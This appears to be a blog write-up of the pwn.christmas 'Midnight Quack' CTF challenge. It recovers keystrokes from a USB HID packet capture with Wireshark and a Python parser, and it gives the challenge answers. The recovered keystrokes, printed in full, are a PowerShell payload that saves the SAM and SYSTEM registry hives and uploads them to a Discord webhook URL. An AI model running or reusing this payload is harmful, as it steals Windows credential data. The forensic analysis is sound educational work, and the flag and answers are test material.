---
title: "Midnight Quack - pwn.christmas"
date: 2024-12-23 00:00:00 -0800
categories: CTF pwn.christmas
tags: HID Wireshark ProtocolAnalysis
---


# Part 1

Challenges in this category will reference the same file(s).

What is the flag found in the file provided?

file provided **midnight_quack_pcap.pcapng**

## Solution

After opening up the file in wireshark we can see that most of the packets are USB Protocol.

After analyzing a bit , we can see that some of the usb packets have HID data, which contains arrays with the keyboard buttons pressed. As an example:

```
Frame 69: 35 bytes on wire (280 bits), 35 bytes captured (280 bits) on interface \\.\USBPcap2, id 0
    Section number: 1
    Interface id: 0 (\\.\USBPcap2)
    Encapsulation type: USB packets with USBPcap header (152)
    Arrival Time: Dec 20, 2024 05:30:19.250807000 Pacific Standard Time
    UTC Arrival Time: Dec 20, 2024 13:30:19.250807000 UTC
    Epoch Arrival Time: 1734701419.250807000
    [Time shift for this packet: 0.000000000 seconds]
    [Time delta from previous captured frame: 0.001965000 seconds]
    [Time delta from previous displayed frame: 0.001965000 seconds]
    [Time since reference or first frame: 5.327536000 seconds]
    Frame Number: 69
    Frame Length: 35 bytes (280 bits)
    Capture Length: 35 bytes (280 bits)
    [Frame is marked: False]
    [Frame is ignored: False]
    [Protocols in frame: usb:usbhid]
USB URB
    [Source: 2.5.1]
    [Destination: host]
    USBPcap pseudoheader length: 27
    IRP ID: 0xffff8584f6061a70
    IRP USBD_STATUS: USBD_STATUS_SUCCESS (0x00000000)
    URB Function: URB_FUNCTION_BULK_OR_INTERRUPT_TRANSFER (0x0009)
    IRP information: 0x01, Direction: PDO -> FDO
        0000 000. = Reserved: 0x00
        .... ...1 = Direction: PDO -> FDO (0x1)
    URB bus id: 2
    Device address: 5
    Endpoint: 0x81, Direction: IN
        1... .... = Direction: IN (1)
        .... 0001 = Endpoint number: 1
    URB transfer type: URB_INTERRUPT (0x01)
    Packet Data Length: 8
    [Request in: 62]
    [Time from request: 2.013981000 seconds]
    [bInterfaceClass: HID (0x03)]
HID Data: 0800150000000000
    .... ...0 = Key: LeftControl (0xe0): UP
    .... ..0. = Key: LeftShift (0xe1): UP
    .... .0.. = Key: LeftAlt (0xe2): UP
    .... 1... = Key: LeftGUI (0xe3): DOWN
    ...0 .... = Key: RightControl (0xe4): UP
    ..0. .... = Key: RightShift (0xe5): UP
    .0.. .... = Key: RightAlt (0xe6): UP
    0... .... = Key: RightGUI (0xe7): UP
    Padding: 00
    Array: 150000000000
        0001 0101 = Usage: Keyboard r and R (0x0007, 0x0015)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000)
        0000 0000 = Usage: Reserved (no event indicated) (0x0007, 0x0000)

```

This packet shows us that `r` pressed. After analyzing the packet we can see that the packets tell us if shift was also pressed (`.... ..0. = Key: LeftShift (0xe1): UP`). so we can tell the difference between 6 and ^.

We can filter the packets by writing `usbhid.data.array != 00:00:00:00:00:00` which will give us only packets that have keyboard presses. now we can extract the data as a txt file.

To find what keys were pressed, I wrote a python code that will remove everything and only show what key was pressed, as an example from the packet above we would only get `r` since the shift key wasn't pressed.

The code:

```python
import re
def parse_hid_data(block):
    shift_key_down = re.search(r'Key: LeftShift.*DOWN|Key: RightShift.*DOWN', block) is not None
    array_pattern = re.compile(r'Array:\s+[0-9a-fA-F]+\n(\s+.*?Usage: Keyboard [^\n]+)')
    array_matches = array_pattern.findall(block)
    output = []
    for line in array_matches:
        usage_match = re.search(r'Usage: Keyboard (.*) \((.*)\)', line)
        if usage_match:
            description = usage_match.group(1)
            if " and " in description:
                if shift_key_down:
                    output.append(description.split(" and ")[1])
                else:
                    output.append(description.split(" and ")[0])
            elif description == "Spacebar":
                output.append(' ')
            elif description == "Underscore":
                output.append('_')
            else:
                output.append(description)
    return ''.join(output)
def process_file(input_file, output_file):
    with open(input_file, 'r') as file:
        content = file.read()
    blocks = content.split("Frame")
    results = []
    for block in blocks:
        if block.strip():
            result = parse_hid_data("Frame" + block)
            results.append(result)
    final_output = ''.join(results)
    with open(output_file, 'w') as out_file:
        out_file.write(final_output)
input_file = 'main.txt'
output_file = 'filter.txt'
process_file(input_file, output_file)


```

The output is:

``` powershell
drpowershell Start-Process powershell -Verb runAsReturn (ENTER)LeftArrowReturn (ENTER)Write-Host "Flag: pwn{h0tplug(underscore)att4ck5(underscore)g0(underscore)h4rd}"Return (ENTER)C:\Windows\System32\reg save HKLM\SAM sam /y; C:\Windows\System32\reg save HKLM\SYSTEM system /y; Add-Type -AssemblyName "System.Net.Http"; $webhookUrl = "https://canary.discord.com/api/webhooks/1319654236287664248/R(underscore)MTWcahrdmScK04fKoVd38U3hF69KSaB0DCGnMPjXyr5nIXhfeO29j3swBn-8qK3L0P"; $client = New-Object System.Net.Http.HttpClient; $fileStream1 = [System.IO.File]::OpenRead("sam"); $fileContent1 = New-Object System.Net.Http.StreamContent($fileStream1); $content1 = New-Object System.Net.Http.MultipartFormDataContent; $content1.Add($fileContent1, "file", "sam"); $client.PostAsync($webhookUrl, $content1).Result; $fileStream1.Close(); $fileStream2 = [System.IO.File]::OpenRead("system"); $fileContent2 = New-Object System.Net.Http.StreamContent($fileStream2); $content2 = New-Object System.Net.Http.MultipartFormDataContent; $content2.Add($fileContent2, "file", "system"); $client.PostAsync($webhookUrl, $content2).Result; $fileStream2.Close()Return (ENTER)d
```

(I forgot to switch underscore to _  but that's easy to do with hand)



flag is: `pwn{h0tplug_att4ck5_g0_h4rd}`

# Part 2

What is being exfiltrated from the endpoint where this capture was taken?

_Hint: We're looking for two file names._

## Solution

After we look at the output we got earlier, we can see the  `$content1.Add($fileContent1, "file", "sam"); $client.PostAsync($webhookUrl, $content1).Result; $fileStream1.Close(); $fileStream2 = [System.IO.File]::OpenRead("system");` part. which gives us two fiiles, sam and system

Answer : Sam, System

# Part 3

What URL were the SAM and SYSTEM files exfiltrated to?

## Solution

The output we got earlier gives us an URL: `https://canary.discord.com/api/webhooks/1319654236287664248/R_MTWcahrdmScK04fKoVd38U3hF69KSaB0DCGnMPjXyr5nIXhfeO29j3swBn-8qK3L0P`

Answer : `https://canary.discord.com/api/webhooks/1319654236287664248/R_MTWcahrdmScK04fKoVd38U3hF69KSaB0DCGnMPjXyr5nIXhfeO29j3swBn-8qK3L0P`



